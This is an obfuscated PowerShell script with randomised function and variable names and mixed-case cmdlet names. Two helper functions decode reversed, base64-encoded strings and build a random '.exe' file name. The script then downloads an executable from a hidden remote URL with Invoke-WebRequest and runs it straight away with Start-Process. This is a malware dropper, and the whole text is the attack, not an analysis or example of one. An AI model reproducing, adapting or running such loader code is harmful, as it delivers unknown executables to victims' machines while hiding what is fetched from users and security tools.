function tErYHmbilNUVZXyTnSsI($encodedString){
    $9379f2ee1749466aa7ffb8c38e753d54 = "\x9";
    $eb12b020de2745b6acd2bbea8c45251d = $encodedString.replace($9379f2ee1749466aa7ffb8c38e753d54, " ") -split " ";
    $cbaf62f8782d4199914dd7d547ee8ceb = $eb12b020de2745b6acd2bbea8c45251d.clone();
    [array]::reverse($cbaf62f8782d4199914dd7d547ee8ceb);
    $98a4598b3ed7434d849cb408ce2fe48b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cbaf62f8782d4199914dd7d547ee8ceb));

    return $98a4598b3ed7434d849cb408ce2fe48b;
}

function dSjxBYDQMcvfNlsyApEn($inputString) {
    $c7176be29d0b404bb7b317d962a0f7e1 = -join ((0x41..0x5a) + (0x61..0x7a) | Get-Random -Count 20 | % {[char]$_});
    return "$c7176be29d0b404bb7b317d962a0f7e1$inputString";
}

$7522f1b799854a509c98253b95f981b0 = tErYHmbilNUVZXyTnSsI("l\x9h\x9X\x9Z\x9u\x9w\x9G\x9b\x9l\x9h\x92\x9c\x9y\x9V\x92\x9d\x9v\x9B\x9H\x9X\x9w\x94\x9S\x9M\x92\x9x\x9F\x9b\x9s\x9V\x9G\x9a\x9T\x9J\x9X\x9Z\x93\x99\x9G\x9U\x9z\x9d\x93\x9b\x9k\x95\x9W\x9a\x9X\x9x\x9l\x9M\x9z\x90\x9W\x9Z\x90\x9N\x9X\x9e\x9T\x9x\x91\x9c\x93\x99\x9G\x9Z\x9u\x9l\x92\x9V\x9c\x9p\x9z\x9Q");
$93fc63713b044a6da0247735bafdfab4 = dSjxBYDQMcvfNlsyApEn(".exe");
$e1351353c14d410ba7c8bcacedd25eb6 = tErYHmbilNUVZXyTnSsI("=\x9=\x9Q\x9Z\x94\x9V\x9m\x9L\x9v\x9d\x9W\x9a\x9y\x9R\x92\x9b\x9S\x9F\x9W\x9a\x92\x9l\x9G\x9b\x9P\x99\x9C\x9d\x9j\x9V\x9m\x9a\x9v\x9J\x9H\x9U\x9v\x94\x9W\x9a\x9h\x91\x92\x9L\x93\x9F\x9m\x9c\x9v\x9Q\x92\x9b\x9S\x9l\x9G\x9b\x9P\x99\x9i\x9M\x93\x9M\x9z\x9M\x9F\x9Z\x9z\x9L\x9t\x99\x92\x9Y\x9u\x9I\x9W\x9d\x9o\x9R\x9X\x9a\x9n\x99\x9y\x9L\x96\x9M\x9H\x9c\x90\x9R\x9H\x9a")

iNvOkE-wEbReQuEsT -Uri $e1351353c14d410ba7c8bcacedd25eb6 -Outfile $93fc63713b044a6da0247735bafdfab4
StArT-pRoCeSs $93fc63713b044a6da0247735bafdfab4